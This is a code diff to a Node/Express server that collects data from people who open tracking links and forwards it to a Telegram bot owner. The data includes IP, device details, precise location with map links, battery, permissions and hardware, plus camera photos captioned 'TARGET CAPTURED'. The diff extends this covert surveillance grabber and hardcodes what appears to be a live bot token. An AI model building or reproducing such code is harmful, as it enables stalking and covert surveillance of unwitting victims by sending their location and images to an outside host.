@@ -12,14 +12,12 @@ const app = express();
 app.use(express.json({ limit: "50mb" }));
 app.use(express.static("public"));
 
-const BOT_TOKEN = "8975100574:AAGHgoUJQrQVQy7FCb1fpqhiZ-DHEUrwu6k"; // 🔁 apna real token daal
+const BOT_TOKEN = "8975100574:AAGHgoUJQrQVQy7FCb1fpqhiZ-DHEUrwu6k";
 const DB_FILE = "./database.json";
 
 // ===== DB =====
 function loadDB() {
-  if (!fs.existsSync(DB_FILE)) {
-    fs.writeFileSync(DB_FILE, "{}");
-  }
+  if (!fs.existsSync(DB_FILE)) fs.writeFileSync(DB_FILE, "{}");
   return JSON.parse(fs.readFileSync(DB_FILE));
 }
 
@@ -78,29 +76,61 @@ app.post("/data", async (req, res) => {
   if (!entry) return res.sendStatus(404);
 
   const chatId = entry.owner;
+  const targetUrl = entry.targetUrl;
 
-  console.log("DATA RECEIVED:", data);
+  // ignore empty / duplicate calls
+  if (!data.IP_Address && !data.Device_Model) {
+    return res.sendStatus(200);
+  }
 
   try {
     const msg = `
-📡 NEW VISITOR
+📊 <b>VISITOR INFORMATION CAPTURED</b>
+━━━━━━━━━━━━━━━━━━
 
-🌍 IP: ${data.IP_Address}
-📱 Device: ${data.Device_Model}
-🌐 Browser: ${data.User_Agent}
-🗣 Language: ${data.Language}
-📺 Screen: ${data.Screen_Resolution}
-🕒 Timezone: ${data.Timezone}
+🖥️ <b>Device & Browser</b>
+   • <b>Device:</b> ${data.Device_Model || "N/A"}
+   • <b>User Agent:</b>
+     <code>${data.User_Agent || "N/A"}</code>
 
-📍 Location:
-${typeof data.Location === "object"
-  ? `Lat: ${data.Location.Latitude}
-Lon: ${data.Location.Longitude}
-Map: ${data.Location.Google_Maps}`
-  : data.Location}
+🌐 <b>Network Information</b>
+   • <b>IP Address:</b> ${data.IP_Address || "N/A"}
+   • <b>Language:</b> ${data.Language || "N/A"}
 
-🔋 Battery: ${data.Battery?.Level || "N/A"}
-⚡ Charging: ${data.Battery?.Charging || "N/A"}
+📍 <b>Location Details</b>
+   • <b>Country:</b> ${data.Location?.Country || "N/A"}
+   • <b>Region:</b> ${data.Location?.Region || "N/A"}
+   • <b>City:</b> ${data.Location?.City || "N/A"}
+   • <b>Postal Code:</b> ${data.Location?.Postal_Code || "N/A"}
+   • <b>Timezone:</b> ${data.Timezone || "N/A"}
+
+🗺 <b>Live Map</b>
+   ${
+     data.Location?.Google_Maps
+       ? `<a href="${data.Location.Google_Maps}">📍 Open Location</a>`
+       : "❌ Not Available"
+   }
+
+🖼️ <b>Display Information</b>
+   • <b>Resolution:</b> ${data.Screen_Resolution || "N/A"}
+
+🔋 <b>Battery Status</b>
+   • <b>Level:</b> ${data.Battery?.Level || "N/A"}
+   • <b>Charging:</b> ${data.Battery?.Charging || "N/A"}
+
+🔐 <b>Device Permissions</b>
+   • <b>Camera:</b> ${data.Permissions?.Camera || "Unknown"}
+   • <b>Location:</b> ${data.Permissions?.Location || "Unknown"}
+
+💾 <b>Hardware & Storage</b>
+   • <b>CPU Cores:</b> ${data.Hardware?.CPU_Cores || "N/A"}
+   • <b>RAM:</b> ${data.Hardware?.Device_Memory_GB || "N/A"} GB
+   • <b>Storage Used:</b> ${data.Storage?.Used || "0.00"} GB
+   • <b>Storage Total:</b> ${data.Storage?.Total || "0.00"} GB
+
+━━━━━━━━━━━━━━━━━━
+🎯 <b>Target:</b>
+<code>${targetUrl}</code>
 `;
 
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -110,7 +140,8 @@ Map: ${data.Location.Google_Maps}`
       },
       body: JSON.stringify({
         chat_id: chatId,
-        text: msg
+        text: msg,
+        parse_mode: "HTML"
       })
     });
 
@@ -130,6 +161,7 @@ app.post("/photo", async (req, res) => {
   if (!entry) return res.sendStatus(404);
 
   const chatId = entry.owner;
+  const targetUrl = entry.targetUrl;
 
   try {
     const { imageData } = req.body;
@@ -143,6 +175,12 @@ app.post("/photo", async (req, res) => {
     const formData = new FormData();
     formData.append("chat_id", chatId);
     formData.append("photo", fs.createReadStream(filePath));
+
+    // 🔥 caption with target
+    formData.append(
+      "caption",
+      `🎯 TARGET CAPTURED 📸\n\n🔗 ${targetUrl}`
+    );
 
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
       method: "POST",
@@ -158,7 +196,7 @@ app.post("/photo", async (req, res) => {
   res.sendStatus(200);
 });
 
-// ===== TELEGRAM WEBHOOK =====
+// ===== TELEGRAM =====
 app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
   const msg = req.body.message;
   if (!msg) return res.sendStatus(200);
@@ -221,7 +259,4 @@ app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
 
 // ===== START =====
 const PORT = process.env.PORT || 3000;
-
-app.listen(PORT, () => {
-  console.log("Server Running 🚀");
-});
+app.listen(PORT, () => console.log("Server Running 🚀"));
